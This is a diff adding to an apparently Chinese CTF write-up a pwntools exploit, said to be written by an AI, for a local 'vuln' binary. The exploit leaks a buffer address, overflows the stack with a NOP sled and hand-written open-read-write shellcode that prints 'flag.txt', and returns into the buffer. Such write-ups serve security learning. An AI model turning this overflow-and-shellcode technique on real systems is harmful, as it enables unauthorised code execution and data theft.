@@ -81,3 +81,76 @@ p.recvuntil(b"shellcode: ")
 p.send(payload)
 p.interactive()
 ```
+
+AI 完成的攻击代码，没有用 cat2，而是手动进行 open-read-write 三个 syscall：
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+import sys
+LOCAL = '--remote' not in sys.argv
+
+if LOCAL:
+    p = process('./vuln')
+else:
+    p = remote('localhost', 9999)
+
+# Receive leaked buffer address
+p.recvuntil(b'Here is your gift: ')
+buffer_addr = int(p.recvline().strip(), 16)
+log.info(f"Leaked buffer: {hex(buffer_addr)}")
+
+p.recvuntil(b'Show me your shellcode: ')
+
+# ORW shellcode: open("flag.txt", O_RDONLY) -> read(fd, buf, 0x100) -> write(1, buf, 0x100)
+shellcode = asm('''
+    /* push "flag.txt" onto stack */
+    xor rax, rax
+    push rax
+    mov rax, 0x7478742e67616c66
+    push rax
+    mov rdi, rsp
+
+    /* open("flag.txt", O_RDONLY) */
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 2
+    syscall
+
+    /* read(fd, rsp+0x100, 0x100) */
+    mov rdi, rax
+    lea rsi, [rsp + 0x100]
+    mov rdx, 0x100
+    xor rax, rax
+    syscall
+
+    /* write(1, rsp+0x100, 0x100) */
+    mov rdi, 1
+    lea rsi, [rsp + 0x100]
+    mov rdx, 0x100
+    mov rax, 1
+    syscall
+''')
+
+log.info(f"Shellcode length: {len(shellcode)}")
+
+# Stack layout (vuln function):
+#   [buffer         ] rbp-0x100  256 bytes
+#   [saved rbp      ] rbp         8 bytes
+#   [return address ] rbp+8       8 bytes
+#
+# Payload: [NOP sled][shellcode][padding to ret addr][buffer_addr]
+
+payload  = b'\x90' * 32                # NOP sled
+payload += shellcode                    # shellcode
+payload += b'\x90' * (264 - len(payload))  # fill to return address
+payload += p64(buffer_addr)            # return to NOP sled
+
+p.send(payload)
+
+# Receive the flag
+p.interactive()
+```
